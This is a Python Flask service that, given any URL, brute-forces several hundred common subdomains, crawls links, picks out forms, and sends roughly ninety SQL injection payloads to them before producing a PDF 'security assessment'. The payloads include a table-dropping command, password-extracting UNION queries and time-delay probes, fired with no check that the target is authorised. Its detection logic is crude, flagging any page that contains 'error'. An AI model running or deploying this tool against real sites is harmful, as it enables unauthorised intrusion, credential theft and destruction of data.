from flask import Flask, request, send_file, jsonify
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import mimetypes
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from datetime import datetime
import io

app = Flask(__name__)
CORS(app) 
PREDEFINED_SUBDOMAINS = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2","dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old",
    "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old",
    "lists", "support", "mobile", "mx", "static", "docs", "beta", "shop", "sql", "secure", 
    "demo", "cp", "calendar", "wiki", "web", "media", "email", "images", "img", "www1", 
    "intranet", "portal", "video", "sip", "dns2", "api", "cdn", "stats", "dns1", "ns4", 
    "www3", "dns", "search", "staging", "server", "mx1", "chat", "wap", "my", "svn", "mail1", 
    "sites", "proxy", "ads", "host", "crm", "cms", "backup", "mx2", "lyncdiscover", "info", 
    "apps", "download", "remote", "db", "forums", "store", "relay", "files", "newsletter", 
    "app", "live", "owa", "en", "start", "sms", "office", "exchange", "ipv4", "mail3", 
    "help", "blogs", "helpdesk", "web1", "home", "library", "ftp2", "ntp", "monitor", 
    "login", "service", "correo", "www4", "moodle", "it", "gateway", "gw", "i", "stat", 
    "stage", "ldap", "tv", "ssl", "web2", "ns5", "upload", "nagios", "smtp2", "online", 
    "ad", "survey", "data", "radio", "extranet", "test2", "mssql", "dns3", "jobs", "services", 
    "panel", "irc", "hosting", "cloud", "de", "gmail", "s", "bbs", "cs", "ww", "mrtg", 
    "git", "image", "members", "poczta", "s1", "meet", "preview", "fr", "cloudflare-resolve-to", 
    "dev2", "photo", "jabber", "legacy", "go", "es", "ssh", "redmine", "partner", "vps", 
    "server1", "sv", "ns6", "webmail2", "av", "community", "cacti", "time", "sftp", "lib", 
    "facebook", "www5", "smtp1", "feeds", "w", "games", "ts", "alumni", "dl", "s2", "phpmyadmin", 
    "archive", "cn", "tools", "stream", "projects", "elearning", "im", "iphone", "control", 
    "voip", "test1", "ws", "rss", "sp", "wwww", "vpn2", "jira", "list", "connect", "gallery", 
    "billing", "mailer", "update", "pda", "game", "ns0", "testing", "sandbox", "job", 
    "events", "dialin", "ml", "fb", "videos", "music", "a", "partners", "mailhost", 
    "downloads", "reports", "ca", "router", "speedtest", "local", "training", "edu", 
    "bugs", "manage", "s3", "status", "host2", "ww2", "marketing", "conference", "content", 
    "network-ip", "broadcast-ip", "english", "catalog", "msoid", "mailadmin", "pay", "access", 
    "streaming", "project", "t", "sso", "alpha", "photos", "staff", "e", "auth", "v2", "web5", 
    "web3", "mail4", "devel", "post", "us", "images2", "master", "rt", "ftp1", "qa", "wp", 
    "dns4", "www6", "ru", "student", "w3", "citrix", "trac", "doc", "img2", "css", "mx3", 
    "adm", "web4", "hr", "mailserver", "travel", "sharepoint", "sport", "member", "bb", 
    "agenda", "link", "server2", "vod", "uk", "fw", "promo", "vip", "noc", "design", 
    "temp", "gate", "ns7", "file", "ms", "map", "cache", "painel", "js", "event", "mailing", 
    "db1", "c", "auto", "img1", "vpn1", "business", "mirror", "share", "cdn2", "site", 
    "maps", "tickets", "tracker", "domains", "club", "images1", "zimbra", "cvs", "b2b", 
    "oa", "intra", "zabbix", "ns8", "assets", "main", "spam", "lms", "social", "faq", 
    "feedback", "loopback", "groups", "m2", "cas", "loghost", "xml", "nl", "research", 
    "art", "munin", "dev1", "gis", "sales", "images3", "report", "google", "idp", "cisco", 
    "careers", "seo", "dc", "lab", "d", "firewall", "fs", "eng", "ann", "mail01", "mantis", 
    "v", "affiliates", "webconf", "track", "ticket", "pm", "db2", "b", "clients", "tech", 
    "erp", "monitoring", "cdn1", "images4", "payment", "origin", "client", "foto", "domain", 
    "pt", "pma", "directory", "cc", "public", "finance", "ns11", "test3", "wordpress", 
    "corp", "sslvpn", "cal", "mailman", "book", "ip", "zeus", "ns10", "hermes", "storage", 
    "free", "static1", "pbx", "banner", "mobil", "kb", "mail5", "direct", "ipfixe", "wifi", 
    "development", "board", "ns01", "st", "reviews", "radius", "pro", "atlas", "links", 
    "in", "oldmail", "register", "s4", "images6", "static2", "id", "shopping", "drupal", 
    "analytics", "m1", "images5", "images7", "img3", "mx01", "www7", "redirect", "sitebuilder", 
    "smtp3", "adserver", "net", "user", "forms", "outlook", "press", "vc", "health", 
    "work", "mb", "mm", "f", "pgsql", "jp", "sports", "preprod", "g", "p", "mdm", "ar", 
    "lync", "market", "dbadmin", "barracuda", "affiliate", "mars", "users", "images8", 
    "biblioteca", "mc", "ns12", "math", "ntp1", "web01", "software", "pr", "jupiter", 
    "labs", "linux", "sc", "love", "fax", "php", "lp", "tracking", "thumbs", "up", "tw", 
    "campus", "reg", "digital", "demo2", "da", "tr", "otrs", "web6", "ns02", "mailgw", 
    "education", "order", "piwik", "banners", "rs", "se", "venus", "internal", "webservices", 
    "cm", "whois", "sync", "lb", "is", "code", "click", "w2", "bugzilla", "virtual", 
    "origin-www", "top", "customer", "pub", "hotel", "openx", "log", "uat", "cdn3", "images0", 
    "cgi", "posta", "reseller", "soft", "movie", "mba", "n", "r", "developer", "nms", 
    "ns9", "webcam", "construtor", "ebook", "ftp3", "join", "dashboard", "bi", "wpad", 
    "admin2", "agent", "wm", "books", "joomla", "hotels", "ezproxy", "ds", "sa", "katalog", 
    "team", "emkt", "antispam", "adv", "mercury", "flash", "myadmin", "sklep", "newsite", 
    "law", "pl", "ntp2", "monitor", "login", "service", "correo", "www4", "moodle", "it"

]

# List of allowed file types
ALLOWED_FILE_TYPES = ["application/pdf", "text/html", "application/json"]

# List to store approved downloaded files
downloaded_files = []

# Function to check file MIME type
def check_file_type(file_url):
    file_type, _ = mimetypes.guess_type(file_url)
    return file_type

# Function to handle file download checking
def handle_file_download(url):
    file_type = check_file_type(url)
    if file_type not in ALLOWED_FILE_TYPES:
        return {"status": "unwanted", "file_url": url, "file_type": file_type}
    return {"status": "allowed", "file_url": url, "file_type": file_type}

# Function to scrape directories
def scrape_directories(url):
    links = set()
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if urlparse(full_url).netloc == urlparse(url).netloc:
                links.add(full_url)
    except requests.RequestException as e:
        print(f"Error scraping {url}: {e}")
    return links

# Function to check status of subdomains
def check_subdomain_status(base_url, subdomain):
    url = f"http://{subdomain}.{base_url}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return url
    except requests.RequestException:
        pass
    return None

# Function to find login/signup forms
def find_login_signup_forms(url):
    forms = []
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action')
            if action and any(keyword in action.lower() for keyword in ["login", "sign", "signin", "signup", "register", "auth", "authenticate", "user", "account", "password", "forgot", "reset", "username", "log", "log-in", "log-in-form", "sign-in", "sign-up","logon", "member", "new-user", "new-account", "create-account", "create-user", "signin-form","signup-form", "register-form", "join", "join-now", "access", "profile", "authentication","create", "start", "get-started", "verify", "confirmation", "credentials", "login-submit","signout", "logout", "exit", "login-btn", "signup-btn", "register-btn", "submit", "button",
    "submit-btn", "continue", "form", "form-container", "submit-form", "password-reset", "reset-form",
    "email", "email-address", "contact", "message", "send-message", "send", "contact-form",
    "get-in-touch", "enquiry", "inquiry", "feedback", "send-feedback", "question", "ask", "help",
    "support", "support-form", "helpdesk", "service", "request", "ticket", "contact-us", "reach-us",
    "phone", "phone-number", "fax", "address", "location", "post", "mail", "write", "form-field",
    "textbox", "textarea", "submit-button", "send-button", "action", "reply", "respond", "ask-question",
    "query", "lookup", "find", "search", "search-box", "search-form", "search-button", "find-results",
    "submit-search", "join-newsletter", "subscribe", "subscription", "subscribe-form", "sign-up-for-news",
    "join-us", "newsletter", "get-updates", "email-subscribe", "subscribe-now", "sign-up-now", "subscribe-btn",
    "email-updates", "get-notified", "newsletter-signup", "newsletter-subscribe", "opt-in", "email-opt-in",
    "unsubscribe", "unsubscribe-link", "update-preferences", "notification", "notifications", "sms",
    "phone-verification", "verify-phone", "otp", "pin", "code", "2fa", "two-factor", "security", "captcha",
    "recaptcha", "challenge", "image-challenge", "human-verification", "security-question", "answer", "hint",
    "hint-question", "confirmation-email", "verify-email", "link", "confirm", "continue-button", "verify-button",
    "proceed", "send-verification", "verify-now", "activate", "activation", "phone-auth", "email-auth",
    "multi-factor", "mfa", "multi-factor-auth", "send-otp", "get-code", "receive-code", "password-confirmation",
    "password-match", "re-enter-password", "confirm-password", "new-password", "old-password", "reset-password",
    "password-update", "change-password", "update-password", "password-strength", "strong-password", "weak-password",
    "security-check", "secure", "secure-auth", "trusted", "secure-login", "strong-auth", "access-code", "sign-up-here",
    "login-here", "log-in-here", "register-here", "create-account-here", "create-your-account", "make-an-account",
    "new-user-registration", "register-now", "complete-registration", "begin-registration", "registration-form",
    "form-control", "submit-registration", "accept", "agree", "consent", "terms", "accept-terms", "agree-terms",
    "terms-and-conditions", "privacy-policy", "confirm-terms", "captcha-check", "verify-you-are-human", "not-a-robot",
    "identity-verification", "personal-details", "profile-details", "basic-info", "user-info", "first-name",
    "last-name", "full-name", "birthdate", "dob", "age", "gender", "male", "female", "non-binary", "other",
    "email-verification", "verify-your-email", "validate-email", "address-details", "country", "state", "zip-code",
    "postal-code", "city", "phone-number", "mobile-number", "country-code", "area-code", "verify-mobile", "phone-auth",
    "mobile-verification", "identity", "social-login", "login-with-google", "login-with-facebook", "login-with-twitter",
    "social-signin", "social-authentication", "oauth", "authorize", "authorize-access", "allow-access", "grant-access",
    "request-permission", "login-via", "signin-via", "signup-via", "sign-up-via", "login-social", "forgot-password",
    "retrieve-password", "recover-password", "recover", "get-password", "send-reset-link", "password-reset-link",
    "reset-link", "generate-link", "confirm-link", "receive-reset-link", "sms-verification", "verify-sms", "phone-auth",
    "update-phone", "change-phone", "update-email", "change-email", "change-address", "save-changes", "apply-changes",
    "update-details", "edit-details", "edit-profile", "profile-update", "update-profile", "personal-info", "account-info",
    "form-submit", "input-field", "field", "radio-button", "checkbox", "dropdown", "select", "option", "submit-query",
    "form-submit-btn", "submit-request", "submit-feedback", "send-request", "send-query", "send-inquiry", "ask-us",
    "ask-question-now", "get-help", "submit-help", "get-support", "support-query", "help-query", "ask-support", 
    "form-response", "response", "message-us", "email-us", "reach-out", "form-send", "order-form", "booking-form", 
    "request-info", "appointment-form", "reservation-form", "booking", "appointment", "reservation", "submit-order", 
    "order-now", "order-submission", "make-a-booking", "reserve", "submit-reservation", "order", "place-order",
    "request-appointment", "schedule-appointment", "set-appointment", "schedule", "request-callback", "callback-form",
    "schedule-callback", "submit-callback", "file-upload", "file-upload-form", "submit-documents", "upload", "upload-file",
    "upload-doc", "send-file", "send-document", "attach", "attachment", "add-attachment", "send-attachment", 
    "browse-file", "choose-file", "select-file", "upload-photo", "upload-picture", "upload-image", "upload-application",
    "submit-application", "application-form", "apply-now", "job-application", "careers", "submit-cv", "upload-cv",
    "upload-resume", "resume-upload", "apply-online", "submit-job", "job-request", "apply-for-position", "apply-for-job",
    "submit-application", "job-form", "online-application", "submit-cv-form", "submit-resume-form", "apply-here", 
    "apply-today"]):
                forms.append(urljoin(url, action))
    except requests.RequestException as e:
        print(f"Error finding forms in {url}: {e}")
    return forms

# Function to perform SQL injection
def perform_sql_injection(url, form_action):
    payloads = [
        ("' OR '' = '", "Attempts to bypass authentication by injecting a condition that is always true."),
        ("' OR 1=1 --", "Classic SQL injection payload that often returns all records from the database."),
        ("'; DROP TABLE users --", "Payload that attempts to drop a database table."),
        ("' UNION SELECT password FROM users --", "Payload that attempts to retrieve passwords from the database."),
        ("'='", "This payload tries to trick the query into accepting the input as a valid condition."),
        ("=0--+", "Attempts to bypass by terminating the query and adding a comment."),
        ("=0--+", "Attempts to bypass by terminating the query and adding a comment."),
    (" OR 1=1", "Classic SQL injection that always returns true, bypassing any logical checks."),
    ("' OR 'x'='x", "Bypasses authentication by injecting a condition that is always true."),
    ("' AND id IS NULL; --", "Attempts to exploit null conditions in the query logic."),
    ("'''''''''''''UNION SELECT '2", "Uses excessive quotes to attempt to bypass input sanitization."),
    ("%00", "Null byte injection, used to terminate strings prematurely in some databases."),
    ("/*…*/", "This payload uses SQL comments to bypass restrictions or manipulate logic."),
    ("+", "Tests for SQL concatenation vulnerabilities, often used in UNION or SELECT queries."),
    ("||", "Checks if the database supports string concatenation via the double-pipe operator."),
    ("%", "Tests for wildcard characters that might bypass query logic."),
    ("@variable", "Attempts to exploit SQL variables to manipulate the query."),
    ("@@variable", "Tests for vulnerabilities related to server-level variables."),
    ("AND 1", "Attempts to inject a true condition, testing for basic logical vulnerabilities."),
    ("AND 0", "Tests if false logical conditions are handled properly."),
    ("AND true", "Tries to inject a true boolean condition to manipulate the query."),
    ("AND false", "Attempts to break the logic by injecting a false condition."),
    ("1-false", "Tests for vulnerabilities by manipulating boolean values in the query."),
    ("1-true", "Tests if the query allows manipulation of boolean values."),
    ("1*56", "Attempts to manipulate mathematical operations in the query."),
    ("-2", "Injects a negative number to test for vulnerabilities in numeric fields."),
    ("1' ORDER BY 1--+", "Orders the results by the first column, which can reveal data structure."),
    ("1' ORDER BY 2--+", "Orders the results by the second column, probing for more information."),
    ("1' ORDER BY 3--+", "Continues to probe for available columns."),
    ("1' ORDER BY 1,2--+", "Orders by multiple columns to test for vulnerabilities."),
    ("1' ORDER BY 1,2,3--+", "Further tests column enumeration and query structure."),
    ("1' GROUP BY 1,2,--+", "Groups results by multiple columns to manipulate query logic."),
    ("1' GROUP BY 1,2,3--+", "Tests grouping vulnerabilities in the database query."),
    ("' GROUP BY columnnames having 1=1 --", "Attempts to exploit HAVING clauses for injection."),
    ("-1' UNION SELECT 1,2,3--+", "Union-based injection, attempting to select additional columns."),
    ("' UNION SELECT sum(columnname) from tablename --", "Tests for arithmetic operations in the SQL query."),
    ("-1 UNION SELECT 1 INTO @,@", "Attempts to insert results into user-defined variables."),
    ("-1 UNION SELECT 1 INTO @,@,@", "Similar to the previous, but with three variables."),
    ("1 AND (SELECT * FROM Users) = 1", "Injects a subquery to access sensitive data like user tables."),
    ("' AND MID(VERSION(),1,1) = '5';", "Probes for the version of the SQL database."),
    ("' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --", "Attempts to query database metadata."),
    (",(select * from (select(sleep(10)))a)", "Tests for time-based SQL injection (delaying response)."),
    ("%2c(select%20*%20from%20(select(sleep(10)))a)", "URL-encoded version of the sleep-based time delay injection."),
    ("';WAITFOR DELAY '0:0:30'--", "Time-delay attack to test if the query pauses for the specified time."),
    (" OR 1=1", "Classic boolean-based injection, making the query always true."),
    (" OR 1=0", "Tests the opposite scenario, making the query always false."),
    (" OR x=x", "Checks for identical comparisons to always return true."),
    (" OR x=y", "Checks if non-identical comparisons will throw errors or vulnerabilities."),
    (" OR 1=1#", "Comment-based bypass, ensuring the injected part is always true."),
    (" OR 1=0#", "Similar to the previous but tests for false logic."),
    (" OR x=x#", "Tests comment-based injections with boolean true logic."),
    (" OR x=y#", "Tests false boolean logic in comment-based injection."),
    (" OR 1=1--", "Tests injection by terminating the query and adding a comment."),
    (" OR 1=0--", "Tests for false condition injection with query termination."),
    (" OR x=x--", "Checks if identical conditions in the injection work as expected."),
    (" OR x=y--", "Tests non-identical conditions in comment-based injections."),
    (" OR 3409=3409 AND ('pytW' LIKE 'pytW'", "Checks for a true condition using the LIKE operator."),
    (" OR 3409=3409 AND ('pytW' LIKE 'pytY'", "Checks for a false condition using the LIKE operator."),
    ("HAVING 1=1", "Injects into HAVING clauses to bypass group filtering."),
    ("HAVING 1=0", "Injects into HAVING clauses with a false condition."),
    ("HAVING 1=1#", "Tests for comment-based injection within the HAVING clause."),
    ("HAVING 1=0#", "Tests false logic in comment-based HAVING injections."),
    ("HAVING 1=1--", "Injects true conditions in HAVING clauses and terminates the query."),
    ("HAVING 1=0--", "Injects false conditions in HAVING clauses and terminates the query."),
    ("AND 1=1", "Simple true condition to manipulate logic."),
    ("AND 1=0", "False condition to manipulate the logic flow."),
    ("AND 1=1--", "True condition injection with query termination."),
    ("AND 1=0--", "False condition injection with query termination."),
    ("AND 1=1#", "True condition injection with comment-based termination."),
    ("AND 1=0#", "False condition injection with comment-based termination."),
    ("AND 1=1 AND '%'='", "True condition injection using wildcards."),
    ("AND 1=0 AND '%'='", "False condition injection using wildcards."),
    ("AND 1083=1083 AND (1427=1427", "Tests for multiple true numeric conditions."),
    ("AND 7506=9091 AND (5913=5913", "Tests false and true conditions together."),
    ("AND 1083=1083 AND ('1427=1427", "Checks for vulnerabilities with string comparisons."),
    ("AND 7506=9091 AND ('5913=5913", "Tests for injection with a mix of false and true conditions."),
    ("AND 7300=7300 AND 'pKlZ'='pKlZ", "Tests string comparisons for always true conditions."),
    ("AND 7300=7300 AND 'pKlZ'='pKlY", "Tests string comparisons for always false conditions."),
    ("AS INJECTX WHERE 1=1 AND 1=1", "Tests true conditions in WHERE clauses."),
    ("AS INJECTX WHERE 1=1 AND 1=0", "Tests false conditions in WHERE clauses."),
    ("WHERE 1=1 AND 1=1--", "Tests WHERE clause injection with termination."),
    ("WHERE 1=1 AND 1=0--", "Tests false logic in WHERE clauses."),
    ("ORDER BY 1--", "Orders by the first column, probing for SQL injection points."),
    ("ORDER BY 2--", "Orders by the second column."),
    ("ORDER BY 31337#", "Tests for large numbers in ORDER BY clauses."),
    ("RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))", "Tests RLIKE condition for true."),
    ("IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--", "Tests for conditional logic within SQL."),
    ("%' AND 8310=8310 AND '%'='", "Tests for wildcard handling in SQL queries."),
    ("and (select substring(@@version,1,1))='X'", "Probes for the SQL version to understand the database.")
    ]

    vulnerabilities = []
    for payload, reason in payloads:
        test_url = f"{form_action}?test={payload}"
        try:
            response = requests.get(test_url)
            if "sql" in response.text.lower() or "error" in response.text.lower():
                vulnerabilities.append((payload, reason))
        except requests.RequestException:
            pass
    return (url, vulnerabilities) if vulnerabilities else (url, [])

# Function to generate the PDF report
def generate_report(vulnerabilities, main_domain_links, subdomain_links, stream):
    doc = SimpleDocTemplate(stream, pagesize=letter)
    story = []
    styles = getSampleStyleSheet()

    
    title_style = styles['Title']
    story.append(Paragraph("Security Assessment Report", title_style))
    story.append(Spacer(1, 0.25 * inch))

   
    date_style = styles['Normal']
    date_text = "Date of Assessment: " + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    story.append(Paragraph(date_text, date_style))
    story.append(Spacer(1, 0.25 * inch))

    
    if vulnerabilities:
        heading_style = ParagraphStyle(name='Heading1', fontName='Helvetica-Bold', fontSize=14, spaceAfter=10)
        story.append(Paragraph("Vulnerabilities Found", heading_style))
        text_style = styles['Normal']
        for url, payloads in vulnerabilities:
            story.append(Paragraph(f"Possible SQL Injection vulnerability at {url}", text_style))
            for payload, reason in payloads:
                story.append(Paragraph(f"Payload: {payload}", text_style))
                story.append(Paragraph(f"Reason: {reason}", text_style))
                story.append(Paragraph("Remedies and Precautionary Measures:", text_style))
                story.append(Paragraph("- Validate and sanitize input parameters in SQL queries.", text_style))
                story.append(Paragraph("- Use parameterized queries to prevent injection attacks.", text_style))
                story.append(Spacer(1, 0.1 * inch))
            story.append(Spacer(1, 0.25 * inch))
    else:
        story.append(Paragraph("No vulnerabilities found", styles['Normal']))

    
    heading_style = ParagraphStyle(name='Heading1', fontName='Helvetica-Bold', fontSize=14, spaceAfter=10)
    story.append(Paragraph("Main Domain Links", heading_style))
    text_style = styles['Normal']
    for link in main_domain_links:
        story.append(Paragraph(f'<a href="{link}" color="blue">{link}</a>', text_style))

    
    story.append(Paragraph("Subdomain Links", heading_style))
    for subdomain, links in subdomain_links.items():
        story.append(Paragraph(f"Subdomain: {subdomain}", heading_style))
        for link in links:
            story.append(Paragraph(f'<a href="{link}" color="blue">{link}</a>', text_style))

    doc.build(story)

@app.route('/generate_report', methods=['POST'])
def generate_report_api():
    try:
        user_url = request.json.get('url')
        if not user_url:
            return jsonify({"error": "URL is required"}), 400

        # Scrape links for the main domain
        main_domain_links = scrape_directories(user_url)
        domain = urlparse(user_url).netloc
        subdomain_links = {}

        # Check each predefined subdomain
        for subdomain in PREDEFINED_SUBDOMAINS:
            status_url = check_subdomain_status(domain, subdomain)
            if status_url:
                subdomain_links[status_url] = scrape_directories(status_url)

        vulnerabilities = []

        # Perform SQL injection tests
        for link in main_domain_links:
            forms = find_login_signup_forms(link)
            for form in forms:
                vulnerability = perform_sql_injection(link, form)
                if vulnerability[1]:
                    vulnerabilities.append(vulnerability)

        pdf_stream = io.BytesIO()
        generate_report(vulnerabilities, main_domain_links, subdomain_links, pdf_stream)
        pdf_stream.seek(0)
        return send_file(pdf_stream, as_attachment=True, download_name='report.pdf', mimetype='application/pdf')

    except Exception as e:
        print(f"Error generating report: {e}")
        return jsonify({"error": "An error occurred while generating the report"}), 500

@app.route('/check_file_download', methods=['POST'])
def check_file_download():
    try:
        file_url = request.json.get('file_url')
        result = handle_file_download(file_url)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": "An error occurred while checking the file"}), 500

@app.route('/add_downloaded_file', methods=['POST'])
def add_downloaded_file():
    try:
        file_url = request.json.get('file_url')
        downloaded_files.append(file_url)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": "An error occurred while adding the file"}), 500

if __name__ == '__main__':
    app.run(debug=True)
